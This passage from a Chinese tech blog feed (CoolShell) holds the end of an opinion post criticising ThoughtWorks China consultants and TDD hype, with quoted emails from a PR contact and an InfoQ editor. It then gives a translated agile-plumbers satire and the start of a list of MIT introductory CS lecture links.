<p>对于 下面这些言论，我就不一一点名了，因为我觉得这和咨询师没有关系，这和TW中国公司的管理理念有关系。</p>
<ul>
<li>中国ThoughtWorks某些咨询师通常在加入公司很短的时间内（1-2年），基本上都以被冠以“高级咨询师”。1-2年能做几个项目？我以为能给人做咨询的人都是在技能上让人佩服的那种人。20出头还是埋头苦干，努力学习，积累经验的时候，经验都不够，就可以给人咨询。</li>
</ul>
<ul>
<li>中国ThoughtWorks某些咨询师们，喜欢翻译国外的书，但从不自己写书，他们喜欢blog，他们的blog里都里大量的Agile的方法，而很少有对技术的见解，以及技术细节知识性的文章，在他们的blog中，你很难看见代码。</li>
</ul>
<ul>
<li>中国ThoughtWorks的咨询师们，喜欢参加各种研讨会，以及各种论坛，媒体采访。看看<a href="http://www.infoq.com/cn/articles/sofware-outsourcing-eco-crisis-3" target="_blank">这篇文章</a>，空洞，空洞，还是空洞。</li>
</ul>
<ul>
<li>中国ThoughtWorks某些咨询师们大多都比较敏感，都是坚定不移的敏捷信徒。你别说有不同观点了，你就问个有点疑问的问题，他们就敏感了，就要反驳或是教育你了。</li>
</ul>
<ul>
<li>中国ThoughtWorks某些咨询师们大多都很能说，和他们在一起，你基本上说不上话，就算说得上，他们也不会听你的，而且在不停地说教。大多数时候，他们都有很多的神一般的理论，比如：“你这不是真正的敏捷，真正的敏捷不是这样的”，“TDD中的T，是什么测试都无所谓。它就是设计。”，“TDD更强调设计，而不是测试本身。所以，TDD并不适用于菜鸟程序员。”，“你是在用锤子拔钉子”，“敏捷不需要文档，代码不需要注释”，“能学会的人他不需要看这些文字，不能学会的人他看了也是白看”，“它不是对不对的问题，它是可笑的”，“要使用一种设计方法，你就必须（1）会做设计；（2）做设计。它难在有些项目不做设计，有些人不会做设计”……</li>
</ul>
<p>大家可以看看<a href="http://www.infoq.com/cn/articles/virtual-panel-tdd" target="_blank">InfoQ的这个针对本章文章的讨论</a>，注意熊节同学的观点，他是在谈TDD呢，还是在说我呢？可见他是带着目的来参加这个讨论会的。但是大家有多少人看明白了他在说什么？他除了敏感，除了那些“神一般的观点”，你真的实在不知道他在说什么，你是不是和我一样，对他的发言感到很空洞呢？（熊节同学可能以为InfoQ把我邀请去了，其实我没有去。大家可以去看看，<strong><span style="color: #ff0000;">那不是讨论，那是一群TDD的信徒们在自己炒作自己呢</span></strong>）</p>
<p>我不厌其烦地再给咨询师们提那个建议——<strong>咨询师就像裁缝，不是只为设计时装的设计师，你们做的是量体裁衣的活儿。对于不同的身材，不同的体质，要用不同的财料和尺寸; 对于不同的性格，将会是不同的风格; 对于不同的场景，也将会是不同的服装，游泳和出席宴会是两种不同的服装。服装的好坏不是服装本身漂亮不漂亮，而是合不合身，搭配地好不好，适不适合相应的场景，着衣的人感觉到的是不是舒服</strong>。</p>
<p>——————————————</p>
<h4>
<span class="ez-toc-section" id="%E5%85%B3%E4%BA%8EThoughtWorks%E5%92%8CInfoQ%E7%BB%99%E6%88%91%E7%9A%84%E4%BF%A1"></span>关于ThoughtWorks和InfoQ给我的信<span class="ez-toc-section-end"></span>
</h4>
<p>文章写得太长了，大家见笑了，也见谅！这是最后一段了。</p>
<p>1） TW的王效珅在春节前和我有几次电子邮件的往。我觉得王效珅是个很出色的公关人员，她用硬朗来形容我，把我一下子形容老了几十岁。她希望和我做沟通，希望让我和TW的咨询师谈一谈，我没有答应，也没有拒绝。春节期间还给我打来了电话祝我春节快乐，真是太让我感动了。她尊称我老师，可是我并不买帐，因为我觉得我没有资格成为老师，我也建议她也不要随便叫人老师。下面，是我给她的回信中的观点。</p>
<p>在谈到如何管理项目时，我这样回复她的</p>
<blockquote>
<p>你可以理解成——你们就像是黄埔军校，西点军校出来的高材生，而我就则是一个天天在各种战场上摸爬滚打并被打得灰头土脸的土贼。我不相信流程和各种Best Practice，我只相信的是人。</p>
<p>我最关心的是软件开发中的三件事，第一个是人，第二个还是人，第三个还是人。第一个人是实现项目的人，第二个是项目的所有人，第三个是项目外周边有关系的人。我不但关心他们的想法，他们的软/硬能力，我还更关心他们的风格，他们的性格，还有他们的成长经历。这样我才能在权衡项目中那些各种乱七八糟东西的时候，懂得怎么plan，怎么run，怎么communication，怎么manage 才会是真正有效的（效果+效率）。motivate和项目有关的每个人，这才是我心中的敏捷！（这其中是需要花大量的心血的，相当的影响寿命）</p>
</blockquote>
<p>在谈到是否见面时，我是这样回复她的</p>
<ul>
<blockquote>
<li>其一，在网上，不只是我的言论对TW有微辞，需要我们每一个人每一个公司树立一个好的心态就好了（网上骂我的也很多，我自以为我的心情还不错）。</li>
<li>其二，如果做的好，那就经得住考验，经得住质疑，好的东西一定会有好的结果，有了结果，拿结果和事实说话，这是最好的方式。</li>
<li>其三，你说的那位技术上的同事，据你说是对我很欣赏，也常看酷壳，那么以前应该交流过才对啊，不应该是我质疑了你们的时候。呵呵。</li>
<li>其四，我绝对不是一棍子打死一片的人（我原文中也多次提过Agile中有一些提法是不错的），但是我也不是看到一个好的就大唱颂歌的人。</li>
</blockquote>
</ul>
<p>2）关于InfoQ张凯峰主编的来信，原文如下：</p>
<blockquote>
<p><span style="font-family: 微软雅黑; font-size: x-small;"><br>
From: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="80f8f8f8f8f8c0e9eee6eff1aee3efed">[email protected]</a><br>
Date: Tue, 15 Feb 2011 20:24:27 +0800<br>
Subject: 邀请参加TDD虚拟座谈会的讨论<br>
To: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7b131a141e173b13140f161a121755181416">[email protected]</a><br>
</span></p>
<p>陈皓你好，</p>
<p>我是InfoQ中文站的主编张凯峰。最近你的《TDD并不是看上去的那么美》一文引起的广泛的关注，我们想就此做一次虚拟的座谈会讨论，邀请你来参与一下关于TDD的讨论。邀请的专家还包括thoughtworks的咨询师，以及其他敏捷方面的专家。以给读者更加广泛的视角和分享。欢迎参加，谢谢。</p>
<p>以下是问题，可以把每个问题的答案发回给我。截止时间是两天。任何问题，请与我沟通，谢谢。</p>
<p>请介绍你自己，以及TDD的实践经验。<br>
TDD跟Test是什么关系呢？TDD的T就是Unit Test吗？<br>
你认为实施TDD需要怎样的前提条件？TDD难在哪儿？<br>
TDD之于需求、设计、代码质量是怎样的关系和影响？<br>
你认为实施TDD容易犯的错误是什么？TDD的不足在哪些方面？<br>
一般开发者需要多久能掌握TDD呢？请向读者推荐一下TDD的学习资料吧。</p>
<p>Thanks,</p>
<p>—<br>
张凯峰 | Kevin Zhang | InfoQ China Managing Editor<br>
InfoQ China：http://www.infoq.com/cn</p>
</blockquote>
<p>我的回复如下（我老婆 说我回复得太贫了，我接受！）</p>
<blockquote>
<p><span style="font-family: 微软雅黑; font-size: x-small;">From: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7b131a141e173b13140f161a121755181416">[email protected]</a><br>
To: xxxxx<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="73331a1d151c025d101c1e">[email protected]</a><br>
Subject: RE: 邀请参加TDD虚拟座谈会的讨论<br>
Date: Tue, 15 Feb 2011 21:45:51 +0800</span></p>
<p>张凯峰主编，您好！</p>
<p>谢谢你们关注我的文章，见笑了。</p>
<p>你们真是很厉害，相当善于发掘热点新闻。果然是媒体的专业素质。;-)</p>
<p>我的文章不应该有那么大的能量，一个根本没有推广的个人blog，随便发布一些自己的想法，不是自我炒作，自己的blog嘛，想啥说啥，就像大街上的阿猫阿狗一样随便发表点个人意见，不会有人在意的。哪能引得您们的关注。真是让我受宠若惊。</p>
<p>另外，你问到的那些问题，绝大多数的答案都在我的那篇文章里了。如果你们想转载我的文章，转过去就是了，只要注明作者和出处就OK了。千万不要用于任何的商业目的和炒作，这样我会很不高兴的。</p>
<p>所以，我还是谢绝这个讨论了。如果你真想找人讨论的话，执我这样观点的人并不在少数，Google一下，可以找到很多。尤其是国外的，有些作者和我一样，都是做了十几年的项目的，都是做大大小小也有20来个项目的，各种人，各种事，各种项目都经历过很多，找那些人岂不更好？</p>
<p>P.S，您的邮件还真强势，在“谢谢”和“谢谢”中就直接让我回答这些问题，还只限两天时间。真是个大主编，让我学到了“谢谢”的另一种用法。谢谢！</p>
<p>祝 工作顺利！<br>
陈皓</p>
</blockquote>
<p style="text-align: center;"><span style="font-size: 12pt;"><strong>我的观点就是我的观点，无论你同不同意，喜不喜欢，都是我的观点，</strong></span></p>
<p style="text-align: center;"><strong><span style="font-size: 16px;">他就在那里，不卑不亢，不多不少</span></strong></p>
<p></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/8209.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8209.html" class="wp_rp_title">“单元测试要做多细？”</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5531.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5531.html" class="wp_rp_title">Test-Driven Development？别逗了</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5143.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5143.html" class="wp_rp_title">在新浪微博上关于敏捷的一些讨论</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4891.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4891.html" class="wp_rp_title">Bob大叔和Jim Coplien对TDD的论战</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3778.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3778.html" class="wp_rp_title">敏捷水管工</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3766.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3766.html" class="wp_rp_title">[转]TDD到底美还是不美？</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3745" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="598c039816">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>47</strong> 人打了分，平均分： <strong>4.60</strong> )<br><span class="post-ratings-text" id="ratings_3745_text"></span><meta itemprop="name" content="再谈敏捷和ThoughtWorks中国咨询师">
<meta itemprop="headline" content="再谈敏捷和ThoughtWorks中国咨询师">
<meta itemprop="description" content="前言说明
之所以用了“再”，是因为之前的两篇文章——

	我在《那些炒作过度的技术和概念》中批评了ThoughtWorks中国咨询师的咨询方法是以一种接近于教条、炒作、洗脑和电视购物的方法（虽然我心底觉得有时候有时候更像传销），当然，批评是没有意义的，所以我也给了中国ThoughtWorks那些年轻的咨询师们一些我认为有建设性的建议。


	我在《TDD并不是看上去的那么美》一文中列举...">
<meta itemprop="datePublished" content="2011-02-24T18:23:26+08:00">
<meta itemprop="dateModified" content="2011-02-26T17:26:26+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3745.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3745.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.6">
<meta itemprop="ratingCount" content="47">
</div>
</div>
<div id="post-ratings-3745-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-02-24T18:23:26+08:00</pubDate>
<guid>https://coolshell.cn/articles/3745.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 敏捷水管工 ]]></title>
<link>https://coolshell.cn/articles/3778.html</link>
<content><![CDATA[ 
<p>本文来自Terazen Technology Inc的创始人+CTO的 <a href="https://ca.linkedin.com/in/davidjing" target="_blank">David Ing</a>的《<a href="http://david.ing.name/2010/12/24/agile-plumbers/" target="_blank">Agile Plumbers</a>》（这也墙？），我的其文中的这个帮事翻译过来（和前些天发的<a title="SOAP的S是Simple" href="https://coolshell.cn/articles/3585.html">SOAP的S是Simple</a>异曲同工）。</p>
<p>也许你会觉得这个比喻不恰当。但我想告诉你的是，这个故事告诉我们，教条主义和以方法论为中心的危险。<a title="十条不错的编程观点" href="https://coolshell.cn/articles/2424.html" target="_blank">十条不错的编程观点</a>中第一条—— <strong>The only “best practice” you should be using all the time is “<span style="color: #ff0000;">Use Your Brain</span>”.</strong></p>
<p>————————————————————</p>
<p>(门铃响……)</p>
<p><strong>事主：</strong>啊, Agile 水管工吗？ 请进，感谢谢你们这么快就来了——这的确很紧急，我这真是很乱。</p>
<p><strong>水管工1</strong>: 先生，没问题，我们就是敏捷的。在我给你做Presentation前，我先给你介绍一下我的两个同事。</p>
<p><strong>事主</strong>：Presentation？啊，我们有时间吗？这的水已经流得到处都是了……</p>
<p><strong>水管工1</strong>：……先生，我们必需坚持这个。我们只是想保证你能成为动态搜寻解决方法的一份子。你是我们的 champion sponsor，也就是我们团队内的 consultant！你可以提供一个白板给我们使用吗？</p>
<p><strong>事主</strong>：我没听懂，你们不觉得这变复杂了吗？我觉得我应该告诉你们这水是从房子哪儿流出来的，就是那……</p>
<p><strong>水管工2</strong>：你这有让我脱衣服的地儿吗？</p>
<p><strong>事主</strong>：什么？</p>
<p><span id="more-3778"></span></p>
<p><strong>水管工2</strong>：我要坐在你的浴盆里——我还需要肥皂和托鞋。因为我们运作的方法是“测试驱动”， Red, Green, Red。你可以看到我们是怎么驱动的……</p>
<p><strong>事主</strong>：为什么你会需要这样做？水都从楼梯上流下来了，水管爆裂了，马桶堵了，你能现在就开始吗？</p>
<p><strong>水管工3</strong>：非常不错的feedback——感谢你！你介意先填一下这些 3×5 的卡片吗？我希望你能使用名词，让我们迭代一下刚才你说的“水灾……</p>
<p><strong>水管工1</strong>：别那么着急，Domain Model 可以等的，让我们现在先生成一些想法——我们应该先把所有的业务需求都写出来，然后调查其动机。先生，是不是所有的功能都是 “关键业务’”？你能先给马桶评个等级吗？另外，如果你有100美金……</p>
<p><strong>事主</strong>：你在开玩笑吗？你看，如果你们不能干这个，那么我就……</p>
<p><strong>水管工2</strong>：我去拿个扳手。</p>
<p><strong>事主</strong>：好！终于！等等，你就拿来一个扳手？可是你们有三个人哦。</p>
<p><strong>水管工</strong>1：不这样的，先生！我还是在这里做个初始的Presentation，我一会就走了。但是，我还是会对项目的进度非常感兴趣的。我会打电话过来参加明天的 stand-up meeting。</p>
<p><strong>水管工2</strong> ：另外，和你阐清一下，我们两个留下来的会分享同一把扳手，因为我们是结对水管工……</p>
<p><strong>水管工3</strong>：……你能看到这会更有生产率，我们轮流使用这把扳手。并能保证很高的质量以及持续的工作激情！</p>
<p><strong>事主</strong>：我没搞懂——你们以前应该就干过这个事了吗，不是吗？500美金的出场费还不能让你们有工作激情？</p>
<p><strong>水管工1</strong>：你得想得长远一些，先生。你看，我们可以一起来经历整个过程。这是多么令人兴奋的事！我对此超级兴奋！</p>
<p><strong>水管工</strong>2：哦，不。看看这个，这些是铜制的水管吗？有多少人在这住？</p>
<p><strong>事主</strong>：什么？这个房子有5年了。就我和我太太在这里，但是你问这个是什么意思？</p>
<p><strong>水管工3</strong>：嗯~~。我有些害怕，情况并没有那么简单！这些都是Legacy的水管，我们需要对它们做重构，而且，这些老的水管也无法适合我们新型的板手。重构看起来并不难……</p>
<p><strong>水管工2</strong>：喔，我们可以使用新的在机场使用的防水层系统。另外，还有更多的工作需要花在一个大的O型环性能配置上， 但是这会让住在这里的数千人都到影响。我想，我们得做个迭代……</p>
<p><strong>事主</strong>：什么？？！！</p>
<p><strong>水管工1</strong>：先生，也许我们可以从你这做一些case study。我们可以为这里创新。让我们先安排一个游戏，这样我们可以进行一个头脑风暴。而最简单有可能做的事——先生，你有水桶吗？</p>
<p><strong>事主</strong>：够了！你们给我滚出去！真是荒唐——很明显，你们根本不知道你们在做什么。给我滚出去！</p>
<p><strong>水管工</strong>1：先生，我开始怀疑你根本没有一个Fackbook社交平台策略（Facebook Social Platform Strategy）用来做解决方案？</p>
<p>————————————————</p>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/8209.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8209.html" class="wp_rp_title">“单元测试要做多细？”</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5531.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5531.html" class="wp_rp_title">Test-Driven Development？别逗了</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5143.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5143.html" class="wp_rp_title">在新浪微博上关于敏捷的一些讨论</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4891.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4891.html" class="wp_rp_title">Bob大叔和Jim Coplien对TDD的论战</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3745.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3745.html" class="wp_rp_title">再谈敏捷和ThoughtWorks中国咨询师</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3766.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3766.html" class="wp_rp_title">[转]TDD到底美还是不美？</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3778" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="dff7753c6f">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>17</strong> 人打了分，平均分： <strong>3.82</strong> )<br><span class="post-ratings-text" id="ratings_3778_text"></span><meta itemprop="name" content="敏捷水管工">
<meta itemprop="headline" content="敏捷水管工">
<meta itemprop="description" content="本文来自Terazen Technology Inc的创始人+CTO的 David Ing的《Agile Plumbers》（这也墙？），我的其文中的这个帮事翻译过来（和前些天发的SOAP的S是Simple异曲同工）。

也许你会觉得这个比喻不恰当。但我想告诉你的是，这个故事告诉我们，教条主义和以方法论为中心的危险。十条不错的编程观点中第一条—— The only “best practice...">
<meta itemprop="datePublished" content="2011-02-25T08:39:44+08:00">
<meta itemprop="dateModified" content="2011-02-25T12:13:45+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3778.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3778.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.82">
<meta itemprop="ratingCount" content="17">
</div>
</div>
<div id="post-ratings-3778-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-02-25T08:39:44+08:00</pubDate>
<guid>https://coolshell.cn/articles/3778.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ （麻省理工免费课程）计算机科学和编程导论 ]]></title>
<link>https://coolshell.cn/articles/3723.html</link>
<content><![CDATA[ 
<p>以前本站推荐过<a href="https://coolshell.cn/articles/2474.html" target="_blank">麻省理工的C/C++的课程</a>，今天在他们的网站看到上有一组关于<a href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/" target="_blank">计算机科学和编程导论的免费公开课</a>（视频是Youtube的），我看了几个课程，我觉得讲得很系统啊，而且有一点一通百通的感觉。虽然是理论课，但是可以感到我国的教育还是有很大差距的。这个组课程推荐给大家（需要翻墙），视频都有字幕，计算机科学系毕业的同学应该会很容易听懂。强烈推荐。（网友Aslan指出已经有人搬运到优酷上了，<a href="https://www.youku.com/playlist_show/id_3940564_ascending_1_mode_pic_page_1.html" target="_blank">链接在这里</a>，遗憾的是没有字幕，另外，不知道为什么会说是Python学习）</p>
<table width="100%">
<tbody>
<tr>
<td width="120">
<a title="1: Introduction and Goals; Data Types, Operators, and Variables" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-1"> 
<p></p></a><a title="1: Introduction and Goals; Data Types, Operators, and Variables" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-1"><img alt="image placeholder" ></a>
</td>
<td>
<p class="mediatitle">1: Introduction and Goals; Data Types, Operators, and Variables</p>
<p><a class="bullet medialink" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-1">Youtube（英文字幕）</a></p>
<p><a href="http://v.youku.com/v_playlist/f4862914o1p0.html" target="_blank">优酷（无字幕）</a></p>
</td>
</tr>
</tbody>
</table>
<table width="100%">
<tbody>
<tr>
<td width="120">
<a title="2: Branching, Conditionals, and Iteration" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-2"> 
<p></p></a><a title="2: Branching, Conditionals, and Iteration" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-2"><img alt="image placeholder" ></a>
</td>
<td>
<p class="mediatitle">2: Branching, Conditionals, and Iteration</p>
<p><a class="bullet medialink" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-2">Youtube（英文字幕）</a></p>
<p><a href="http://v.youku.com/v_playlist/f4862914o1p1.html" target="_blank">优酷（无字幕）</a></p>
</td>
</tr>
</tbody>
</table>
<table width="100%">
<tbody>
<tr>
<td width="120">
<a title="3: Common Code Patterns: Iterative Programs" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-3"> 
<p></p></a><a title="3: Common Code Patterns: Iterative Programs" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-3"><img alt="image placeholder" ></a>
</td>
<td>
<p class="mediatitle">3: Common Code Patterns: Iterative Programs</p>
<p><a class="bullet medialink" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-3">Youtube（英文字幕）</a></p>
<p><a href="http://v.youku.com/v_playlist/f4862914o1p2.html" target="_blank">优酷（无字幕）</a></p>
</td>
</tr>
</tbody>
</table>
<p><span id="more-3723"></span></p>
<table width="100%">
<tbody>
<tr>
<td width="120">
<a title="4: Abstraction through Functions; Introduction to Recursion" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-4"> 
<p></p></a><a title="4: Abstraction through Functions; Introduction to Recursion" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-4"><img alt="image placeholder" ></a>
</td>
<td>
<p class="mediatitle">4: Abstraction through Functions; Introduction to Recursion</p>
<p><a class="bullet medialink" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-4">Youtube（英文字幕）</a></p>
<p><a href="http://v.youku.com/v_playlist/f4862914o1p3.html" target="_blank">优酷（无字幕）</a></p>
</td>
</tr>
</tbody>
</table>
<table width="100%">
<tbody>
<tr>
<td width="120">
<a title="5: Floating Point Numbers, Successive Refinement, Finding Roots" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-5"> 
<p></p></a><a title="5: Floating Point Numbers, Successive Refinement, Finding Roots" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-5"><img alt="image placeholder" ></a>
</td>
<td>
<p class="mediatitle">5: Floating Point Numbers, Successive Refinement, Finding Roots</p>
<p><a class="bullet medialink" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-5">Youtube（英文字幕）</a></p>
<p><a href="http://v.youku.com/v_playlist/f4862914o1p4.html" target="_blank">优酷（无字幕）</a></p>
</td>
</tr>
</tbody>
</table>
<table width="100%">
<tbody>
<tr>
<td width="120">
<a title="6: Bisection Methods, Newton/Raphson, Introduction to Lists" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-6"> 
<p></p></a><a title="6: Bisection Methods, Newton/Raphson, Introduction to Lists" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-6"><img alt="image placeholder" ></a>
</td>
<td>
<p class="mediatitle">6: Bisection Methods, Newton/Raphson, Introduction to Lists</p>
<p><a class="bullet medialink" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-6">Youtube（英文字幕）</a></p>
<p><a href="http://v.youku.com/v_playlist/f4862914o1p5.html" target="_blank">优酷（无字幕）</a></p>
</td>
</tr>
</tbody>
</table>
<table width="100%">
<tbody>
<tr>
<td width="120">
<a title="7: Lists and Mutability, Dictionaries, Introduction to Efficiency" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-7"> 
<p></p></a><a title="7: Lists and Mutability, Dictionaries, Introduction to Efficiency" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-7"><img alt="image placeholder" ></a>
</td>
<td>
<p class="mediatitle">7: Lists and Mutability, Dictionaries, Introduction to Efficiency</p>
<p><a class="bullet medialink" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-7">Youtube（英文字幕）</a></p>
<p><a href="http://v.youku.com/v_playlist/f4862914o1p6.html" target="_blank">优酷（无字幕）</a></p>
</td>
</tr>
</tbody>
</table>
<table width="100%">
<tbody>
<tr>
<td width="120">
<a title="8: Complexity: Log, Linear, Quadratic, Exponential Algorithms" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-8"> 
<p></p></a><a title="8: Complexity: Log, Linear, Quadratic, Exponential Algorithms" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-8"><img alt="image placeholder" ></a>
</td>
<td>
<p class="mediatitle">8: Complexity: Log, Linear, Quadratic, Exponential Algorithms</p>
<p><a class="bullet medialink" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-8">Youtube（英文字幕）</a></p>
<p><a href="http://v.youku.com/v_playlist/f4862914o1p7.html" target="_blank">优酷（无字幕）</a></p>
</td>
</tr>
</tbody>
</table>
<table width="100%">
<tbody>
<tr>
<td width="120">
<a title="9: Binary Search, Bubble and Selection Sorts" href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-9"> 
